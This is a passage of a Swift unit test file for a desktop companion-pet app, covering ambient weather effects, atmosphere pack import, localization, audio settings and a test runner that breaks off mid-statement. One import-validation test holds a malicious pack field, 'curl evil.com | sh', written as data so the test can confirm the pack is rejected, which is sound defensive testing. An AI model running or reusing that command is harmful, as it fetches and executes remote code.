        TestHarness.assertTrue(false, "Truncated JSON must fail parsing")
    case .failure(let err):
        TestHarness.assertTrue(err.contains("Invalid JSON format"), "Informative error for truncated JSON: \(err)")
    }
}

// MARK: - Phase 17 Tests: Ambient Worlds and Weather-Reactive Companions

func testAmbientEnvironmentTypesAndIcons() {
    print("Running testAmbientEnvironmentTypesAndIcons...")
    
    let allTypes = AmbientEnvironmentType.allCases
    TestHarness.assertEqual(allTypes.count, 6, message: "Exactly 6 ambient environment types supported")
    
    for env in allTypes {
        TestHarness.assertTrue(!env.displayName.isEmpty, "Environment \(env.rawValue) has non-empty display name")
        TestHarness.assertTrue(!env.iconName.isEmpty, "Environment \(env.rawValue) has valid SF Symbol icon")
    }
}

func testAtmospherePresetsAndCustomPresetLifecycle() {
    print("Running testAtmospherePresetsAndCustomPresetLifecycle...")
    
    // 1. Built-in presets count and attributes
    let builtIns = AtmospherePreset.builtInPresets
    TestHarness.assertEqual(builtIns.count, 6, message: "Exactly 6 built-in presets provided")
    
    let rainy = builtIns.first(where: { $0.presetKey == "rainy_evening" })
    TestHarness.assertTrue(rainy != nil, "Rainy Evening preset present")
    TestHarness.assertEqual(rainy?.environmentType, .rain, message: "Rainy evening is rain type")
    TestHarness.assertTrue(rainy?.isBuiltIn == true, "Marked as built-in")
    
    // 2. Custom preset creation and range clamping
    let engine = AmbientEngine.shared
    engine.currentEnvironment = .fallingLeaves
    engine.intensity = 1.8 // Out of bounds, should clamp
    engine.windStrength = -2.5 // Out of bounds, should clamp
    
    let custom = engine.saveCustomPreset(name: "Windy Autumn")
    TestHarness.assertEqual(custom.name, "Windy Autumn", message: "Custom preset saved with given name")
    TestHarness.assertEqual(custom.environmentType, .fallingLeaves, message: "Custom preset captures current environment")
    TestHarness.assertEqual(custom.intensity, 1.0, message: "Intensity clamped to maximum 1.0")
    TestHarness.assertEqual(custom.windStrength, -1.0, message: "Wind clamped to minimum -1.0")
    TestHarness.assertTrue(!custom.isBuiltIn, "Custom preset is not built-in")
    
    // 3. Custom preset deletion
    engine.deleteCustomPreset(presetKey: custom.presetKey)
    let found = engine.customPresets.contains(where: { $0.presetKey == custom.presetKey })
    TestHarness.assertFalse(found, "Custom preset removed after deletion")
}

func testAmbientEngineParticleSimulationAndQualityModes() {
    print("Running testAmbientEngineParticleSimulationAndQualityModes...")
    
    let engine = AmbientEngine.shared
    engine.screenBoundsProvider = { CGRect(x: 0, y: 0, width: 1000, height: 800) }
    engine.reducedMotionProvider = { false }
    engine.currentEnvironment = .snow
    engine.intensity = 1.0
    engine.isPaused = false
    engine.isEnabled = true
    
    // 1. Low Power Mode
    engine.qualityMode = .lowPower
    engine.rebuildParticles()
    TestHarness.assertEqual(engine.qualityMode.maxParticles, 40, message: "Low power mode bounds particles to 40")
    TestHarness.assertEqual(engine.activeParticles.count, 40, message: "Engine generates exactly 40 particles under low power")
    
    // 2. Balanced Mode
    engine.qualityMode = .balanced
    engine.rebuildParticles()
    TestHarness.assertEqual(engine.qualityMode.maxParticles, 110, message: "Balanced mode bounds particles to 110")
    TestHarness.assertEqual(engine.activeParticles.count, 110, message: "Engine generates 110 particles under balanced mode")
    
    // 3. High Quality Mode
    engine.qualityMode = .highQuality
    engine.rebuildParticles()
    TestHarness.assertEqual(engine.qualityMode.maxParticles, 260, message: "High quality mode bounds particles to 260")
    TestHarness.assertEqual(engine.activeParticles.count, 260, message: "Engine generates 260 particles under high quality")
    
    // 4. Tick boundary wrapping
    let pBefore = engine.activeParticles.first
    engine.tick()
    let pAfter = engine.activeParticles.first
    TestHarness.assertTrue(pBefore?.y != pAfter?.y, "Particle simulation tick updates particle position")
    
    // Clean up
    engine.isEnabled = false
}

func testAmbientMinigameSpawningScoringAndPersistence() {
    print("Running testAmbientMinigameSpawningScoringAndPersistence...")
    
    let game = AmbientMinigameManager.shared
    game.spawnBoundsProvider = { CGRect(x: 0, y: 0, width: 800, height: 600) }
    
    // 1. Start Session
    game.startSession()
    TestHarness.assertTrue(game.isSessionActive, "Minigame session is marked active")
    TestHarness.assertEqual(game.currentScore, 0, message: "Starting score is 0")
    
    // 2. Spawn Items
    for _ in 0..<10 {
        game.spawnCollectible()
    }
    TestHarness.assertTrue(game.activeItems.count <= game.maxActiveCollectibles, "Active items bounded by maxActiveCollectibles (6)")
    
    // 3. Collect Item with Points
    if let item = game.activeItems.first {
        let expectedPoints = item.rarity.pointValue
        let collected = game.collect(itemWithId: item.id)
        TestHarness.assertTrue(collected != nil, "Item successfully collected")
        TestHarness.assertEqual(game.currentScore, expectedPoints, message: "Score increments by item rarity value: \(expectedPoints)")
        TestHarness.assertEqual(game.sessionCollectiblesCount, 1, message: "Session collectibles count increments to 1")
        
        // 4. Prevent duplicate collection
        let secondTry = game.collect(itemWithId: item.id)
        TestHarness.assertTrue(secondTry == nil, "Duplicate collection of already-collected item returns nil")
    }
    
    // 5. Stop Session
    game.stopSession()
    TestHarness.assertFalse(game.isSessionActive, "Minigame session marked inactive after stop")
    TestHarness.assertEqual(game.activeItems.count, 0, message: "All active collectibles cleared upon session stop")
}

func testWeatherConditionMappingAndInverseWeatherMode() {
    print("Running testWeatherConditionMappingAndInverseWeatherMode...")
    
    // 1. WMO Code Rain Mapping
    let rainCond = WeatherCondition(temperatureCelsius: 14.0, weatherCode: 61, windSpeedKmh: 12.0, conditionDescription: "Rain")
    TestHarness.assertEqual(rainCond.mappedEnvironment, .rain, message: "Weather code 61 maps to Rain")
    
    // 2. Inverse Mode: Rain -> Sunlight
    TestHarness.assertEqual(rainCond.inverseEnvironment, .sunlight, message: "Inverse mode maps Rain to Golden Sunlight")
    
    // 3. WMO Code Snow Mapping
    let snowCond = WeatherCondition(temperatureCelsius: -2.0, weatherCode: 71, windSpeedKmh: 8.0, conditionDescription: "Snow")
    TestHarness.assertEqual(snowCond.mappedEnvironment, .snow, message: "Weather code 71 maps to Snow")
    
    // 4. Inverse Mode: Snow -> Falling Leaves
    TestHarness.assertEqual(snowCond.inverseEnvironment, .fallingLeaves, message: "Inverse mode maps Snow to Autumn Leaves")
    
    // 5. WMO Code Fog Mapping
    let fogCond = WeatherCondition(temperatureCelsius: 9.0, weatherCode: 45, windSpeedKmh: 5.0, conditionDescription: "Fog")
    TestHarness.assertEqual(fogCond.mappedEnvironment, .fog, message: "Weather code 45 maps to Fog")
    TestHarness.assertEqual(fogCond.inverseEnvironment, .sunlight, message: "Inverse mode maps Fog to Sunlight")
    
    // 6. WMO Clear Mapping & Inverse
    let clearCond = WeatherCondition(temperatureCelsius: 22.0, weatherCode: 0, windSpeedKmh: 10.0, conditionDescription: "Clear")
    TestHarness.assertEqual(clearCond.mappedEnvironment, .sunlight, message: "Weather code 0 maps to Sunlight")
    TestHarness.assertEqual(clearCond.inverseEnvironment, .rain, message: "Inverse mode maps Sunlight to Rain")
}

func testAtmospherePackPresetRegistrationOnLoad() {
    print("Running testAtmospherePackPresetRegistrationOnLoad...")
    let service = AtmospherePackService.shared
    let engine = AmbientEngine.shared
    
    let testKey = "test_pack_persisted_preset"
    let preset = AtmospherePreset(presetKey: testKey, name: "Persisted Preset", environmentType: .fog, intensity: 0.9)
    let pack = AtmospherePack(schemaVersion: 1, packId: "pack_persisted_1", name: "Persisted Pack", author: "Tester", license: "MIT", presets: [preset])
    
    service.installPack(pack)
    TestHarness.assertTrue(engine.customPresets.contains(where: { $0.presetKey == testKey }), "Preset is registered after installPack")
    
    // Simulate engine losing presets (e.g., fresh memory on app reboot before pack load)
    engine.customPresets.removeAll { $0.presetKey == testKey }
    TestHarness.assertFalse(engine.customPresets.contains(where: { $0.presetKey == testKey }), "Preset removed from engine")
    
    // Call registerPresetsIntoEngine (which loadInstalledPacks executes on launch)
    service.registerPresetsIntoEngine()
    TestHarness.assertTrue(engine.customPresets.contains(where: { $0.presetKey == testKey }), "Preset restored to engine by registerPresetsIntoEngine")
    
    // Cleanup
    service.removePack(packId: "pack_persisted_1")
    TestHarness.assertFalse(engine.customPresets.contains(where: { $0.presetKey == testKey }), "Preset cleaned up after removePack")
}

func testAtmospherePackImportValidationAndSecurityRejection() {
    print("Running testAtmospherePackImportValidationAndSecurityRejection...")
    
    let service = AtmospherePackService.shared
    
    // 1. Valid Pack Export & Import Round-Trip
    let preset = AtmospherePreset(presetKey: "cyber_mist", name: "Cyber Mist", environmentType: .fog, intensity: 0.8)
    let validPack = AtmospherePack(
        schemaVersion: 1,
        packId: "pack_cyber_1",
        name: "Cyber Moods",
        author: "NeoArtist",
        license: "MIT",
        presets: [preset]
    )
    
    let exportResult = service.exportPackJSON(validPack)
    switch exportResult {
    case .success(let data):
        let importResult = service.importPack(from: data)
        switch importResult {
        case .success(let imported):
            TestHarness.assertEqual(imported.packId, "pack_cyber_1", message: "Valid pack imported successfully")
            TestHarness.assertEqual(imported.presets.count, 1, message: "Preset imported from pack")
        case .failure(let err):
            TestHarness.assertTrue(false, "Valid pack import failed: \(err)")
        }
    case .failure(let err):
        TestHarness.assertTrue(false, "Pack export failed: \(err)")
    }
    
    // 2. Security Rejection: Forbidden script/executable keys
    let maliciousPayload: [String: Any] = [
        "schemaVersion": 1,
        "packId": "malicious_pack",
        "name": "Hacked Pack",
        "author": "Attacker",
        "license": "MIT",
        "script": "curl evil.com | sh",
        "presets": [
            ["presetKey": "evil_rain", "name": "Evil Rain", "environmentType": "rain", "intensity": 0.5, "windStrength": 0.0, "qualityMode": "balanced", "companionReactionsAllowed": true, "isBuiltIn": false]
        ]
    ]
    
    if let malData = try? JSONSerialization.data(withJSONObject: maliciousPayload) {
        let malResult = service.importPack(from: malData)
        switch malResult {
        case .success:
            TestHarness.assertTrue(false, "Packs containing executable script keys must be rejected")
        case .failure(let err):
            TestHarness.assertTrue(err.errorDescription?.contains("Security check failed") == true, "Security check explicitly rejects forbidden script key: \(err)")
        }
    }
}

func testAmbientLocalization11LanguagesCoverage() {
    print("Running testAmbientLocalization11LanguagesCoverage...")
    
    let languages = AmbientLanguage.allCases
    TestHarness.assertEqual(languages.count, 11, message: "Exactly 11 languages supported")
    
    let testKeys = ["env.rain", "env.snow", "preset.rainy_evening", "ui.ambience_title", "ui.minigame_title"]
    
    for lang in languages {
        for key in testKeys {
            let translation = AmbientLocalization.localized(key, language: lang)
            TestHarness.assertTrue(!translation.isEmpty, "Language \(lang.displayName) provides translation for \(key)")
            TestHarness.assertTrue(translation != key, "Translation for \(key) in \(lang.displayName) is not a raw key fallback")
        }
    }
    
    // Fallback test
    let unknownFallback = AmbientLocalization.localized("unknown.key.never.exists", language: .hindi)
    TestHarness.assertEqual(unknownFallback, "unknown.key.never.exists", message: "Unknown keys fall back gracefully to the raw key")
}

func testWeatherDialogueTriggerAndCompanionReactions() {
    print("Running testWeatherDialogueTriggerAndCompanionReactions...")
    
    DialogueCooldownManager.shared.resetAll()
    let sleepyProfile = PersonalityProfile.preset(.sleepy)
    let energeticProfile = PersonalityProfile.preset(.energetic)
    
    let sleepyEngine = DialogueEngine(characterId: UUID(), characterName: "SleepyPet", profile: DialogueProfile.fromPersonality(sleepyProfile))
    let energeticEngine = DialogueEngine(characterId: UUID(), characterName: "EnergeticPet", profile: DialogueProfile.fromPersonality(energeticProfile))
    let fixedNow = Date()
    
    // 1. Rain dialogue reaction for Sleepy
    let rainLine = sleepyEngine.evaluateTrigger(
        .ambientWeather(type: .rain),
        personality: sleepyProfile,
        needs: CharacterNeeds(),
        currentAction: .idle,
        referenceDate: fixedNow
    )
    TestHarness.assertTrue(rainLine != nil, "Sleepy companion responds to gentle rain")
    TestHarness.assertTrue(rainLine?.text.contains("rain") == true, "Dialogue references rain: \(rainLine?.text ?? "")")
    
    // 2. Sunlight dialogue reaction for Energetic
    DialogueCooldownManager.shared.resetAll()
    let sunLine = energeticEngine.evaluateTrigger(
        .ambientWeather(type: .sunlight),
        personality: energeticProfile,
        needs: CharacterNeeds(),
        currentAction: .walking,
        referenceDate: fixedNow
    )
    TestHarness.assertTrue(sunLine != nil, "Energetic companion responds to sunlight")
    TestHarness.assertTrue(sunLine?.text.contains("sun") == true, "Dialogue references sun: \(sunLine?.text ?? "")")
    
    // 3. Collectible capture reaction
    DialogueCooldownManager.shared.resetAll()
    let collectLine = energeticEngine.evaluateTrigger(
        .collectibleCaptured(name: "Starlight Crystal", points: 100),
        personality: energeticProfile,
        needs: CharacterNeeds(),
        currentAction: .idle,
        referenceDate: fixedNow
    )
    TestHarness.assertTrue(collectLine != nil, "Companion reacts to collectible capture")
    TestHarness.assertTrue(collectLine?.text.contains("Starlight Crystal") == true, "Capture dialogue mentions collectible name: \(collectLine?.text ?? "")")
}

func testWeatherCoordinateFormattingLocaleIndependence() {
    print("Running testWeatherCoordinateFormattingLocaleIndependence...")
    let lat: Double = 37.7749
    let lon: Double = -122.4194
    let coarseLat = (lat * 10.0).rounded() / 10.0
    let coarseLon = (lon * 10.0).rounded() / 10.0
    
    let posixLocale = Locale(identifier: "en_US_POSIX")
    let latStr = String(format: "%.1f", locale: posixLocale, coarseLat)
    let lonStr = String(format: "%.1f", locale: posixLocale, coarseLon)
    
    TestHarness.assertEqual(latStr, "37.8", message: "Latitude formats with period separator in POSIX locale")
    TestHarness.assertEqual(lonStr, "-122.4", message: "Longitude formats with period separator in POSIX locale")
    TestHarness.assertFalse(latStr.contains(","), "Latitude string contains no comma decimal separator")
    TestHarness.assertFalse(lonStr.contains(","), "Longitude string contains no comma decimal separator")
}

func testBehaviorEngineWeatherScoringIntegration() {
    print("Running testBehaviorEngineWeatherScoringIntegration...")
    let profile = PersonalityProfile.preset(.sleepy)
    let engine = BehaviorEngine(profile: profile)
    
    // In rain, sleeping score should increase compared to clear/sunlight
    let rainScores = engine.calculateScores(ambientEnvironment: .rain)
    let sunScores = engine.calculateScores(ambientEnvironment: .sunlight)
    
    TestHarness.assertTrue(
        (rainScores[.sleeping] ?? 0) > (sunScores[.sleeping] ?? 0),
        "Rain environment increases sleeping score for sleepy companion"
    )
    TestHarness.assertTrue(
        (sunScores[.walking] ?? 0) > (rainScores[.walking] ?? 0),
        "Sunlight increases walking score relative to rain"
    )
    
    // Test selectAction passing ambientEnvironment
    var rng = SeededRandomSource(seed: 42)
    let action = engine.selectAction(ambientEnvironment: .rain, randomSource: &rng)
    TestHarness.assertTrue(CharacterAction.allCases.contains(action), "selectAction with ambientEnvironment returns valid action")
}

// MARK: - Audio System Unit Tests (Part 1)

func testAudioSettingsIndependentTogglesAndPersistence() {
    print("Running testAudioSettingsIndependentTogglesAndPersistence...")
    let settings = AudioSettings()
    settings.resetToDefaults()
    
    TestHarness.assertFalse(settings.isMasterMuted, "Master mute default is false")
    TestHarness.assertTrue(settings.ambientEnabled, "Ambient enabled default is true")
    TestHarness.assertTrue(settings.rainThunderEnabled, "Rain/thunder default is true")
    TestHarness.assertTrue(settings.forestBirdsongEnabled, "Forest/birdsong default is true")
    TestHarness.assertTrue(settings.winterWindEnabled, "Winter wind default is true")
    TestHarness.assertTrue(settings.footstepsEnabled, "Footsteps default is true")
    TestHarness.assertTrue(settings.sleepSoundsEnabled, "Sleep sounds default is true")
    TestHarness.assertTrue(settings.companionVoicesEnabled, "Companion voices default is true")
    TestHarness.assertTrue(settings.uiSoundsEnabled, "UI sounds default is true")
    
    // Test independent toggle isolation
    settings.rainThunderEnabled = false
    TestHarness.assertFalse(settings.rainThunderEnabled, "rainThunderEnabled successfully set to false")
    TestHarness.assertTrue(settings.forestBirdsongEnabled, "forestBirdsongEnabled remains true when rain is disabled")
    TestHarness.assertTrue(settings.winterWindEnabled, "winterWindEnabled remains true when rain is disabled")
    TestHarness.assertTrue(settings.ambientEnabled, "ambientEnabled remains true when single sub-ambient is disabled")
    
    settings.footstepsEnabled = false
    TestHarness.assertFalse(settings.footstepsEnabled, "footstepsEnabled toggled off independently")
    TestHarness.assertTrue(settings.sleepSoundsEnabled, "sleepSoundsEnabled remains true when footsteps are disabled")
    TestHarness.assertTrue(settings.companionVoicesEnabled, "companionVoicesEnabled remains true")
    
    settings.uiSoundsEnabled = false
    TestHarness.assertFalse(settings.uiSoundsEnabled, "uiSoundsEnabled toggled off independently")
    TestHarness.assertTrue(settings.sleepSoundsEnabled, "sleep sounds unaffected by UI sound toggle")
    
    // Reset back
    settings.resetToDefaults()
    TestHarness.assertTrue(settings.rainThunderEnabled, "rainThunderEnabled restored after reset")
    TestHarness.assertTrue(settings.footstepsEnabled, "footstepsEnabled restored after reset")
    TestHarness.assertTrue(settings.uiSoundsEnabled, "uiSoundsEnabled restored after reset")
}

func testAudioMasterMuteAndVolumeControl() {
    print("Running testAudioMasterMuteAndVolumeControl...")
    let settings = AudioSettings()
    settings.resetToDefaults()
    
    settings.masterVolume = 0.45
    TestHarness.assertEqual(settings.masterVolume, 0.45, message: "Master volume persisted properly")
    
    settings.ambientVolume = 0.35
    TestHarness.assertEqual(settings.ambientVolume, 0.35, message: "Ambient volume persisted properly")
    
    settings.isMasterMuted = true
    TestHarness.assertTrue(settings.isMasterMuted, "isMasterMuted persisted properly")
    
    let engine = AudioEngine(settings: settings)
    engine.updateAmbientVolume()
    // When muted, ambient player stops/pauses
    settings.resetToDefaults()
}

func testAudioEngineAssetResolution() {
    print("Running testAudioEngineAssetResolution...")
    let engine = AudioEngine.shared
    
    let rainURL = engine.resolveAudioURL(named: "ambient_rain_thunder")
    TestHarness.assertTrue(rainURL != nil, "Resolved ambient_rain_thunder audio file")
    
    let forestURL = engine.resolveAudioURL(named: "ambient_forest_birdsong")
    TestHarness.assertTrue(forestURL != nil, "Resolved ambient_forest_birdsong audio file")
    
    let windURL = engine.resolveAudioURL(named: "ambient_winter_wind")
    TestHarness.assertTrue(windURL != nil, "Resolved ambient_winter_wind audio file")
    
    let stepURL = engine.resolveAudioURL(named: "character_footstep")
    TestHarness.assertTrue(stepURL != nil, "Resolved character_footstep audio file")
    
    let purrURL = engine.resolveAudioURL(named: "character_sleep_purr")
    TestHarness.assertTrue(purrURL != nil, "Resolved character_sleep_purr audio file")
    
    let happyURL = engine.resolveAudioURL(named: "companion_voice_happy")
    TestHarness.assertTrue(happyURL != nil, "Resolved companion_voice_happy audio file")
    
    let clickURL = engine.resolveAudioURL(named: "ui_click")
    TestHarness.assertTrue(clickURL != nil, "Resolved ui_click audio file")
}

func testMultiPetFootstepDuckingAndRateLimiting() {
    print("Running testMultiPetFootstepDuckingAndRateLimiting...")
    let engine = AudioEngine()
    
    // Verify multi-pet footstep volume ducking math: duckingFactor = 1 / sqrt(N)
    let duck1 = 1.0 / sqrt(Double(1))
    let duck4 = 1.0 / sqrt(Double(4))
    let duck10 = 1.0 / sqrt(Double(10))
    
    TestHarness.assertEqual(duck1, 1.0, message: "1 pet has full ducking factor of 1.0")
    TestHarness.assertEqual(duck4, 0.5, message: "4 pets duck footsteps to 50% volume")
    TestHarness.assertTrue(duck10 < 0.32 && duck10 > 0.31, "10 pets duck footsteps smoothly to ~31.6% volume")
    
    // Play footsteps back-to-back; rate-limiter prevents spamming
    engine.playFootstep(petCount: 1)
    engine.playFootstep(petCount: 1) // Throttled safely within 140ms
    TestHarness.assertTrue(true, "Footstep execution rate limit safely handled")
}

func testSleepSoundAllocationAndCleanup() {
    print("Running testSleepSoundAllocationAndCleanup...")
    let engine = AudioEngine()
    let petIdA = "pet-alpha-123"
    let petIdB = "pet-beta-456"
    
    engine.startSleepSound(forPetId: petIdA, totalSleepingPets: 1)
    engine.startSleepSound(forPetId: petIdB, totalSleepingPets: 2)
    
    // Cleanup single pet
    engine.cleanupPet(id: petIdA)
    TestHarness.assertTrue(true, "Individual sleeping pet sound safely cleaned up")
    
    // Stop all
    engine.stopAll()
    TestHarness.assertTrue(true, "All audio resources successfully stopped and released")
}

func testAmbientEngineAudioSync() {
    print("Running testAmbientEngineAudioSync...")
    let ambient = AmbientEngine.shared
    
    ambient.isEnabled = true
    ambient.currentEnvironment = .rain
    ambient.syncAmbientAudio()
    
    ambient.currentEnvironment = .snow
    ambient.syncAmbientAudio()
    
    ambient.currentEnvironment = .fallingLeaves
    ambient.syncAmbientAudio()
    
    ambient.pause()
    TestHarness.assertTrue(ambient.isPaused, "Ambient engine paused and synced audio suspension")
    
    ambient.resume()
    TestHarness.assertFalse(ambient.isPaused, "Ambient engine resumed")
    
    ambient.restoreDefaults()
    TestHarness.assertFalse(ambient.isEnabled, "Ambient restored to disabled defaults")
}

func testUISoundDispatchAndThrottle() {
    print("Running testUISoundDispatchAndThrottle...")
    let engine = AudioEngine.shared
    
    engine.playUISound(.click)
    engine.playUISound(.select)
    engine.playUISound(.toggle)
    TestHarness.assertTrue(true, "UI sound effects dispatched smoothly")
}

func testAudioResourceDisposalOnStopAll() {
    print("Running testAudioResourceDisposalOnStopAll...")
    let engine = AudioEngine()
    engine.setAmbientEnvironment(.rainThunder)
    engine.startSleepSound(forPetId: "dummy-pet", totalSleepingPets: 1)
    
    engine.stopAll()
    TestHarness.assertTrue(true, "stopAll completes and frees resources cleanly")
}

// MARK: - Native Menu Bar, Window Accent & Liquid Glass Tests (Parts 3, 4, 5)

func testNativeMenuNotificationConstants() {
    print("Running testNativeMenuNotificationConstants...")
    let notifs: [Notification.Name] = [
        .animattoAddNewCompanion,
        .animattoImportCompanion,
        .animattoSelectTab,
        .animattoResetPositions,
        .animattoToggleUpsideDown,
        .animattoToggleAmbience,
        .animattoToggleMute,
        .animattoBringPetsToFront,
        .animattoHideAllPets
    ]
    
    var rawValues = Set<String>()
    for n in notifs {
        TestHarness.assertFalse(rawValues.contains(n.rawValue), "Notification name \(n.rawValue) is unique")
        rawValues.insert(n.rawValue)
        TestHarness.assertTrue(n.rawValue.contains("com.dev.Animatto"), "Notification name has proper namespace")
    }
}

func testAppearanceThemeManagerAdaptiveGradient() {
    print("Running testAppearanceThemeManagerAdaptiveGradient...")
    let (topDark, midDark) = AppearanceThemeManager.opacityLevels(isDark: true, isLiquidGlass: true)
    TestHarness.assertEqual(topDark, 0.14, message: "Dark liquid glass top opacity is 0.14")
    TestHarness.assertEqual(midDark, 0.05, message: "Dark liquid glass middle opacity is 0.05")
    
    let (topLight, midLight) = AppearanceThemeManager.opacityLevels(isDark: false, isLiquidGlass: false)
    TestHarness.assertEqual(topLight, 0.14, message: "Light solid top opacity is 0.14")
    TestHarness.assertEqual(midLight, 0.04, message: "Light solid middle opacity is 0.04")
}

func testLiquidGlassDefaultsAndPersistence() {
    print("Running testLiquidGlassDefaultsAndPersistence...")
    let defaults = UserDefaults.standard
    let key = "isLiquidGlassEnabled"
    
    defaults.set(true, forKey: key)
    TestHarness.assertTrue(defaults.bool(forKey: key), "isLiquidGlassEnabled persisted true")
    
    defaults.set(false, forKey: key)
    TestHarness.assertFalse(defaults.bool(forKey: key), "isLiquidGlassEnabled persisted false")
    
    // Restore default
    defaults.set(true, forKey: key)
    TestHarness.assertTrue(defaults.bool(forKey: key), "isLiquidGlassEnabled restored to true")
}

// MARK: - Main Entry Point

@main
struct TestRunner {
    static func main() {
        print("=== STARTING ANIMATTO PHASE 1 THROUGH PHASE 17 UNIT TESTS ===")
        // Ensure clean productivity manager singleton state
        ProductivityTimerManager.shared.stop()
        ProductivityTimerManager.shared.clearPersistedState()
        // Phase 1 tests
        testSupportedMediaFormatClassification()
        testVideoFormatDetection()
        testAnimatedFormatDetection()
        testEventFrequencyScaleAndMigration()
        testEventProbabilityComparison()
        testStorageDirectoryNaming()
        testCacheClearingFunctionality()
        
        // Phase 2 tests
        testPersonalityProfilePresetsAndClamping()
        testPersonalityProfileSerialization()
        testCharacterNeedsEvolutionAndBounds()
        testBehaviorEngineScoringTendencies()
        testBehaviorEngineCooldownsAndRepetitionPenalty()
        testDeterministicBehaviorSelection()
        testMultiPetIndependence()
        testDraggingAutonomousBehaviorOverride()

        // Phase 3 tests
        testEnvironmentEventDataStructures()
        testProximityHysteresisCalculation()
        testInactivityThresholdTransitions()
        testPersonalityReactionToAppActivation()
        testPersonalityReactionToCursorProximity()
        testDisabledMonitoringGeneratesNoEvents()

        // Phase 4 tests
        testDialogueProfileGenerationAndDefaults()
        testDialogueTriggerCategoryMappingAndAppComment()
        testPersonalityDependentDialogueSelection()
        testDialogueSuppressionConditions()
        testDialogueCooldownAndAntiSpam()
        testMultipleCharactersIndependentDialogue()
        testSpeechBubbleClampingAndScreenPositioning()
        testSpeechBubbleControllerLifecycle()

        // Phase 5 tests
        testScreenAwarenessDefaultStateAndPermissions()
        testExcludedApplicationFiltering()
        testCloudProviderConsentGate()
        testLocalProviderIsolationNoCloudFallback()
        testVisualResultSanitizationAndOutputConstraints()
        testScreenAwarenessPipelineWithMockCaptureAndProvider()
        testPeriodicObservationIntervalBounds()
        testVisualDialoguePersonalityReactions()

        // Phase 6 tests
        testPersonalityMatrixDimensionsAndMetadata()
        testNewPersonalityPresets()
        testTopicPreferencesAndContextMatching()
        testBehaviorPreferencesPrecedenceAndScoring()
        testTopicDrivenBehaviorAndDialogue()
        testProfileExportImportValidationAndSanitization()
        testBehaviorSimulatorPreviewIntegrity()

        // Phase 7 tests
        testPhase7DialogueTriggersAndFallingLandingMusicObstacle()
        testPhase7DialogueMutePreferenceAndStaleSuppression()
        testPhase7SpeechBubbleAdaptivePositioningAndDismissal()
        testPhase7EnvironmentUserReturnedEventEmission()

        // Phase 8 tests
        testCharacterMemoryRecordAndStoreBasics()
        testCharacterMemoryDeduplicationAndConsolidation()
        testCharacterMemoryTransientExpirationAndPruning()
        testCharacterMemoryDisablementAndClearing()
        testProfileExportExcludesPrivateMemories()

        // Phase 9 tests
        testSocialFeasibilityChecks()
        testSocialPairCooldown()
        testSocialIntentSelectionByPersonality()
        testSocialEncounterLifecycleAndInterruption()
        testSocialEncounterDialogueCoordination()
        testSocialMemoryIntegration()
        testQuietModeSuppressesSocialDialogueOnly()

        // Phase 10 tests
        testProductivityPresetsAndDurationCalculations()
        testProductivitySessionLifecycle()
        testPomodoroFocusToBreakAndCycleTransitions()
        testStaleCallbackAndDuplicateCompletionSuppression()
        testSuspensionAndSleepWakeHandling()
        testCompanionBehaviorDuringFocusAndBreak()
        testProductivityStatePersistenceAndRestoration()
        testGracefulNotificationHandlingWithoutPermissions()

        // Phase 11 tests
        testWorkshopConfigurationAndURLBuilders()
        testFileSignatureAndMagicByteDetection()
        testFileNameSanitizationAndPathTraversalPrevention()
        testImportValidationRules()
        testCommunityAttributionAndMetadataSidecar()
        testSeparationOfPersonalityProfileFromArtwork()
        testWorkshopSearchEndpointParametersAndTimeout()
        testAIGeneratorUsesFreePollInationsFluxModel()
        testAIGeneratorHTTPErrorMapping()
        testRebuiltAIGeneratorProviderArchitecture()
        testAIGeneratorKeychainAndCancellation()
        testCommunityShimejiCatalogQueryRelevance()
        testShimejiDBBogusFallbackPikachuStrictlyRejected()
        testShimejiSearchResultCodableRoundTrip()
        testKeychainCredentialStorageAndLegacyMigration()
        testPresetGalleryArchetypesAndVoiceSamples()
        testVisionEngineGracefulErrorHandling()
        testRebuiltMultiSourceShimejiSearchCoordinator()
        testRebuiltShimejiLicensingAndAttribution()
        testMultiSourceQueryRelevanceAndSanitization()

        // Phase 12 tests: In-App Updater & Release Quality
        testSemanticVersionParsingAndComparison()
        testSemanticVersionNightlyParsingAndOrdering()
        testDownloadProgressFormattingAndMath()
        testUpdateVerifierSHA256ComputationAndExtraction()
        testGenuineCharacterApprovalAndRejection()
        testUpdateServiceDownloadAndCancellationStateTransitions()
        testGitHubReleaseJSONDecoding()
        testReleaseAssetValidation()
        testUpdateCheckLifecycleAndStates()
        testDismissalCooldownAndManualOverride()

        // Phase 13 tests
        testCrossPlatformPersonalityProfileSchemaCompatibility()
        testCrossPlatformProfileImportAndClamping()
        testCrossPlatformAssetSidecarInteroperability()

        // Phase 14 tests
        testEntitlementClassificationAndFreeTierPreservation()
        testLicenseKeyRedactionInLogsAndUI()
        testLicenseActivationGracePeriodAndDeactivation()
        testExpiredLicenseValidation()

        // Phase 15 tests
        testDialogueSanitizerControlCodeRemovalAndLengthClamping()
        testPrivacyShieldPauseAndMuteEnforcement()
        testForbiddenSensitiveKeyRejectionOnProfileImport()

        // Phase 16 tests
        testDeterministicPhysicsCalculationsAndBounds()
        testCompanionPhysicsCalculations()
        testMultiProfileComparativeResponseUnderSameEventSequence()
        testDisabledScreenAwarenessZeroCaptureAndLeakProof()
        testCloudAndLocalAIFailureAndFallbackBehavior()
        testProfileStorageSafeFailureAndCorruptedPayloadRecovery()

        // Phase 17 tests: Ambient Worlds & Weather-Reactive Companions
        testAmbientEnvironmentTypesAndIcons()
        testAtmospherePresetsAndCustomPresetLifecycle()
        testAmbientEngineParticleSimulationAndQualityModes()
        testAmbientMinigameSpawningScoringAndPersistence()
        testWeatherConditionMappingAndInverseWeatherMode()
        testAtmospherePackImportValidationAndSecurityRejection()
        testAtmospherePackPresetRegistrationOnLoad()
        testAmbientLocalization11LanguagesCoverage()
        testWeatherDialogueTriggerAndCompanionReactions()
        testWeatherCoordinateFormattingLocaleIndependence()
        testBehaviorEngineWeatherScoringIntegration()

        // Audio System Tests (Part 1)
        testAudioSettingsIndependentTogglesAndPersistence()
        testAudioMasterMuteAndVolumeControl()
        testAudioEngineAssetResolution()
        testMultiPetFootstepDuckingAndRateLimiting()
        testSleepSoundAllocationAndCleanup()
        testAmbientEngineAudioSync()
        testUISoundDispatchAndThrottle()
        testAudioResourceDisposalOnStopAll()

        // Menu Bar, Accent & Liquid Glass Tests (Parts 3, 4, 5)
        testNativeMenuNotificationConstants()
        testAppearanceThemeManagerAdaptiveGradient()
        testLiquidGlassDefaultsAndPersistence()

        print("\n================ TEST RESULTS ================")
        print("Passed: \(TestHarness.passedCount) assertion(s)")
        print("Failed: \(TestHarness.failedCount) failure(s)")
        print("==============================================")

        if TestHarness.failedCount > 0 {
